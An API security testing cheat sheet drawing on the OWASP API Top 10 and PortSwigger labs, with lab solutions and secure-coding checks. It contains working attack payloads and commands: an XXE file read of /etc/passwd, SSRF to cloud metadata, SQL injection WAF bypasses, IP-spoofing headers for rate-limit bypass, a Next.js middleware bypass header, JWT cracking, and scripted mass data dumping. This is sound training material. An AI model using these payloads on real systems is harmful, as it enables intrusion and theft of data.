# API Testing - Quick Reference Cheat Sheet

## OWASP API Security Top 10 (2023) - One-Liner Summary

| # | Vulnerability | Attack | Prevention |
|---|--------------|--------|-----------|
| API1 | Broken Object Level Authorization (BOLA) | `GET /api/users/456` (change ID) | Check authorization on every request |
| API2 | Broken Authentication | JWT signature bypass, weak secrets | Verify signatures, strong secrets (256+ bits) |
| API3 | Broken Object Property Level Authorization | Mass assignment: `{"role":"admin"}` | Use DTOs, whitelist updatable fields |
| API4 | Unrestricted Resource Consumption | Unlimited requests, no rate limiting | Rate limiting, request timeouts, pagination |
| API5 | Broken Function Level Authorization | Access `/api/admin` as regular user | RBAC, deny by default, check all methods |
| API6 | Unrestricted Business Flows | Automated ticket scalping | CAPTCHA, behavioral analysis, velocity checks |
| API7 | Server Side Request Forgery | `http://169.254.169.254/latest/meta-data/` | URL allowlisting, block private IPs |
| API8 | Security Misconfiguration | Exposed errors, verbose messages | Secure defaults, generic error messages |
| API9 | Improper Inventory Management | Forgotten legacy endpoints | Maintain API inventory, deprecate old versions |
| API10 | Unsafe Consumption of APIs | Trust third-party API responses | Validate all external data, treat as untrusted |

---

## PortSwigger Labs - Quick Solutions

### Lab 1: API Documentation Exploitation
```http
# Progressive endpoint discovery
PATCH /api/user/wiener → /api/user → /api
GET /api  # Returns Swagger/OpenAPI docs
DELETE /api/user/carlos  # Use documented endpoint
```

### Lab 2: Hidden API Endpoints
```http
# Discover methods
OPTIONS /api/products/1/price
→ Allow: GET, PATCH

# Exploit
PATCH /api/products/1/price HTTP/1.1
Content-Type: application/json
{"price":0}
```

### Lab 3: Mass Assignment
```http
# Compare GET vs POST
GET /api/checkout → {"chosen_discount": {"percentage": 0}}

# Inject hidden parameter
POST /api/checkout
{"chosen_discount": {"percentage": 100}, "chosen_products": [...]}
```

### Lab 4: Query String Parameter Pollution
```http
# Discovery
username=admin%23 → Field not specified
username=admin%26field=x%23 → Invalid field

# Enumeration (Burp Intruder)
username=admin%26field=§PARAM§%23
Payloads: email, username, reset_token

# Exploit
username=admin%26field=reset_token%23
```

### Lab 5: REST Path Parameter Pollution
```http
# Path traversal
username=../../../../openapi.json%23
→ Returns: /api/internal/v1/users/{username}/field/{field}

# Exploit
username=../../v1/users/admin/field/passwordResetToken%23
```

---

## Common API Documentation Paths

```
/api, /api/v1, /api/v2, /api/v3
/swagger, /swagger-ui, /swagger-ui.html, /swagger/index.html
/api-docs, /api/docs, /docs
/openapi.json, /swagger.json, /api/swagger.json
/v1/api-docs, /v2/api-docs
/__docs__, /redoc
/graphql, /graphiql, /playground
/api.json, /api.yaml, /openapi.yaml
/apidocs, /api-documentation
```

---

## Server-Side Parameter Pollution - Quick Reference

### Query String Injection Characters
```
%23  →  #   Truncate query string
%26  →  &   Add new parameter
%3D  →  =   Parameter assignment
%3F  →  ?   Query string start
%3B  →  ;   Parameter separator (some frameworks)
%00  →  \0  Null byte injection
```

### Testing Methodology
```http
# 1. Baseline
username=admin

# 2. Truncation test
username=admin%23

# 3. Parameter injection
username=admin%26debug=true%23

# 4. Field discovery (Burp Intruder)
username=admin%26field=§PARAM§%23
Payloads: email, username, password, reset_token, api_key, role

# 5. Exploitation
username=admin%26field=reset_token%23
```

### REST Path Traversal
```
# Path traversal depth testing
username=..%2fadmin
username=..%2f..%2fadmin
username=..%2f..%2f..%2f..%2fopenapi.json%23

# API version manipulation
username=..%2f..%2fv1%2fusers%2fadmin%2ffield%2femail%23
username=..%2f..%2fv2%2fusers%2fadmin%2ffield%2fpassword%23
```

---

## HTTP Methods Testing

### Discovery
```http
OPTIONS /api/endpoint HTTP/1.1
→ Allow: GET, POST, PUT, PATCH, DELETE, OPTIONS
```

### Testing All Methods
```http
GET /api/resource/123       # Read
POST /api/resource          # Create
PUT /api/resource/123       # Replace entire
PATCH /api/resource/123     # Partial update
DELETE /api/resource/123    # Remove
HEAD /api/resource/123      # Headers only
TRACE /api/resource         # Echo for debug
CONNECT /api/resource       # Tunnel
```

---

## Mass Assignment Detection

### Process
```
1. GET /api/user/profile  → Identify all fields
2. POST /api/user/profile → Compare submitted vs returned
3. Inject undocumented fields from GET response
4. Observe behavioral changes
```

### Common Hidden Parameters
```json
{
  "email": "user@example.com",
  "role": "admin",           // Privilege escalation
  "isAdmin": true,           // Boolean flags
  "is_active": true,
  "credit": 999999,          // Financial manipulation
  "discount": 100,           // Pricing
  "permissions": ["*"],      // Access control
  "account_type": "premium", // Feature access
  "verified": true,          // Verification bypass
  "is_staff": true
}
```

---

## Content-Type Manipulation

### Common Content Types
```
application/json
application/xml
application/x-www-form-urlencoded
multipart/form-data
text/plain
text/xml
application/soap+xml
application/vnd.api+json
application/graphql
```

### JSON to XML Conversion
```json
Original (JSON):
{"username": "admin", "password": "pass"}
```

```xml
Convert to XML:
<?xml version="1.0"?>
<root>
  <username>admin</username>
  <password>pass</password>
</root>
```

### XXE via Content-Type Switch
```http
POST /api/login HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <username>&xxe;</username>
  <password>pass</password>
</root>
```

---

## Parameter Discovery

### Param Miner (Burp Extension)
- Right-click request → Guess (cookies|headers|GET|POST) parameters
- Automatically tests 65,536+ parameter names
- Context-aware suggestions

### Common Parameter Names
```
# Identity
id, user_id, userid, username, email, account_id

# Authentication
token, access_token, api_key, key, auth, bearer

# Authorization
role, admin, isAdmin, is_admin, permissions, access_level

# Financial
price, discount, amount, total, cost, fee

# Pagination
page, limit, offset, count, size, per_page

# Format
format, type, content_type, output

# Redirection
callback, redirect, url, next, return_url

# Debug
debug, verbose, trace, test, dev_mode
```

---

## WAF Bypass Techniques (2025)

### Encoding Variations
```
Normal:        admin' OR 1=1--
Single encode: admin%27%20OR%201%3D1--
Double encode: admin%2527%2520OR%25201%253D1--
Unicode:       admin\u0027 OR 1=1--
```

### Case Randomization
```sql
SeLeCt * FrOm users WhErE username='admin'
```

### Inline Comments
```sql
SEL/**/ECT * FR/**/OM users
SEL/*comment*/ECT * FR//OM users
```

### HTTP Parameter Pollution
```
PHP (last):        user=normal&user=admin → admin
ASP.NET (concat):  user=normal&user=admin → normal,admin
Node.js (first):   user=admin&user=normal → admin
```

### Header Injection for Rate Limiting Bypass
```http
X-Forwarded-For: 1.2.3.4, 5.6.7.8, 9.10.11.12
X-Originating-IP: 192.168.1.100
X-Remote-IP: 10.0.0.5
X-Client-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
True-Client-IP: 10.0.0.5
Forwarded: for=127.0.0.1
```

### SQLMap Tamper Scripts
```bash
# Random case
sqlmap -u "http://target.com/api?id=1" --tamper=randomcase

# Space to comment
sqlmap -u "http://target.com/api?id=1" --tamper=space2comment

# Multiple tampers
sqlmap -u "http://target.com/api?id=1" --tamper=randomcase,space2comment,charunicodeencode
```

### Next.js Middleware Bypass (CVE-2025-29927)
```http
GET /api/admin HTTP/1.1
x-middleware-subreq: skip
```

---

## Burp Suite Extensions for API Testing

| Extension | Purpose | Key Feature |
|-----------|---------|-------------|
| OpenAPI Parser | Import API specs | Parse Swagger/OpenAPI 2.0/3.0 |
| Param Miner | Discover hidden params | 65,536+ guesses per request |
| Content Type Converter | JSON ↔ XML conversion | Bypass input validation |
| JS Link Finder | Extract API endpoints | Process minified JavaScript |
| Autorize | Authorization testing | Auto-test with different roles |
| Turbo Intruder | High-speed fuzzing | Race conditions, rate limit bypass |
| Active Scan++ | Additional checks | Host header, CORS, template injection |
| JWT Editor | JWT manipulation | Key management, signing, attacks |

---

## Common Attack Patterns

### Sequential ID Enumeration
```python
for id in range(1, 1000000):
    response = requests.get(f"/api/users/{id}")
    if response.status_code == 200:
        exfiltrate(response.json())
```

### Parameter Manipulation
```json
// Standard request
{"user_id": "123", "action": "view"}

// Manipulated request
{"user_id": "456", "action": "admin_access", "bypass": true}
```

### Authentication Bypass
```http
# Missing auth check
GET /api/internal/admin/users HTTP/1.1
# No Authorization header required!
```

### Mass Data Exfiltration
```bash
for i in {1..1000000}; do
    curl "https://api.target.com/data?page=$i" >> dump.txt
    sleep 0.1
done
```

---

## Real-World Breach Quick Stats

| Company | Year | Vulnerability | Impact | Key Issue |
|---------|------|--------------|--------|-----------|
| Trello | 2024 | API1 (BOLA) | 15M users | No auth on lookup API |
| Cox Comms | 2024 | API2+API5 | Millions | No auth on admin functions |
| Dell | 2024 | API4 | 49M records | No rate limiting |
| SOLARMAN | 2024 | API2 | Auth bypass | JWT signature not verified |
| DeepSeek | 2025 | API8 | 1M+ logs | Database publicly accessible |
| Coinbase | 2025 | API6 | $250k bounty | Logic flaw in trading |

---

## Testing Tools Quick Reference

### Commercial
- **Burp Suite Pro/Enterprise**: Full-featured API testing
- **APIsec**: Automated security testing
- **42Crunch**: Design-first security
- **Salt Security**: AI-powered detection
- **Traceable AI**: API security posture management

### Open-Source
```bash
# OWASP ZAP
zap-cli quick-scan https://api.target.com

# Ffuf (endpoint discovery)
ffuf -u https://api.target.com/v1/FUZZ -w api-endpoints.txt

# Arjun (parameter discovery)
arjun -u https://api.target.com/endpoint

# Kiterunner (content discovery)
kr scan https://api.target.com -w routes-large.kite

# Nuclei (template-based)
nuclei -u https://api.target.com -t api/
```

---

## Wordlists

### SecLists Locations
```
Discovery/Web-Content/api/
- api-endpoints.txt
- api-endpoints-res.txt
- graphql.txt
- swagger.txt

Fuzzing/
- api-parameters.txt
- http-methods.txt
- content-types.txt
```

### Create Custom Wordlists
```bash
# Extract from JavaScript
cat *.js | grep -oP '(?<=")\/api[^"]*' | sort -u > api-endpoints.txt

# Extract parameters
jq -r '.[] | .request.url' burp-history.json | grep -oP '\?[^&]+' > params.txt
```

---

## Secure Development Quick Checks

### Authentication & Authorization
```python
# ✅ CORRECT
@app.route('/api/users/<user_id>')
@require_jwt
def get_user(user_id):
    if current_user.id != user_id and not current_user.is_admin:
        return jsonify({"error": "Forbidden"}), 403
    return jsonify(get_user_data(user_id))
```

### Mass Assignment Protection
```python
# ✅ CORRECT - Use DTOs
class UserCreateDTO:
    allowed_fields = ['username', 'email', 'password']

    def __init__(self, data):
        self.data = {k: v for k, v in data.items() if k in self.allowed_fields}
```

### Rate Limiting
```python
# ✅ CORRECT
from flask_limiter import Limiter

limiter = Limiter(app, default_limits=["200/day", "50/hour"])

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    pass
```

### Parameter Handling (SSPP Prevention)
```python
# ✅ CORRECT - Parameterized requests
response = requests.get(
    "https://internal-api/users/profile",
    params={"username": username}  # Auto-encoded
)
```

### Error Handling
```python
# ✅ CORRECT - Generic errors
@app.errorhandler(APIError)
def handle_error(error):
    return jsonify({"error": "An error occurred", "code": error.code}), error.status
    # Don't include: stack traces, internal errors, DB errors, file paths
```

---

## One-Liner Exploitation Commands

### API Discovery
```bash
# Swagger/OpenAPI discovery
ffuf -u https://target.com/FUZZ -w api-docs-wordlist.txt -mc 200

# Endpoint fuzzing
wfuzz -w api-endpoints.txt https://api.target.com/v1/FUZZ

# Parameter discovery
arjun -u https://api.target.com/endpoint -m POST
```

### JWT Attacks
```bash
# Brute-force weak secret
hashcat -m 16500 -a 0 jwt.txt rockyou.txt

# Test algorithm confusion
jwt_tool TOKEN -X a

# Test header injection
jwt_tool TOKEN -I -hc kid -hv "../../../../../../dev/null"
```

### SSPP Testing
```bash
# Query string
curl "http://api.target.com/forgot?username=admin%26field=reset_token%23"

# REST path
curl "http://api.target.com/api/user/../../v1/users/admin/field/email%23"
```

---

## Emergency Debugging

### Check API Documentation
```bash
# Common paths
curl https://api.target.com/api
curl https://api.target.com/swagger.json
curl https://api.target.com/openapi.json
curl https://api.target.com/api-docs
```

### Quick Method Test
```bash
# Test all methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
    echo "$method:"
    curl -X $method https://api.target.com/endpoint
done
```

### Quick Parameter Test
```bash
# Test common parameters
for param in id user_id role admin debug; do
    curl "https://api.target.com/api?$param=value"
done
```

---

## Modern Attack Trends (2025)

| Trend | Percentage | Description |
|-------|-----------|-------------|
| Business Logic | 27% | Up 10% since 2023 |
| Automated Attacks | 88% | Leverage OWASP Top 10 |
| Account Takeover | 46% | Up from 35% in 2022 |
| API Attack Traffic | +191% | Year-over-year increase |
| Organizations Hit | 99% | Experienced API issues in Q1 2025 |

**Cost Impact**: $2.5B from API vulnerabilities (2024), Average breach: $4.88M

---

## Quick Prevention Checklist

- [ ] Authentication on every endpoint
- [ ] Authorization checks on every request
- [ ] Input validation with allowlists
- [ ] Rate limiting (per key, per IP, cost-based)
- [ ] Use DTOs for mass assignment protection
- [ ] Disable unnecessary HTTP methods
- [ ] Generic error messages (no stack traces)
- [ ] API inventory documented
- [ ] Swagger/OpenAPI requires authentication
- [ ] JWT signatures verified with algorithm whitelist
- [ ] CORS configured restrictively
- [ ] Logging and monitoring enabled
- [ ] Regular security testing
- [ ] Deprecated endpoints removed

---

*Quick reference for API security testing and secure development*
*Based on OWASP API Security Top 10 2023 and PortSwigger Web Security Academy*
*Last Updated: January 2025*
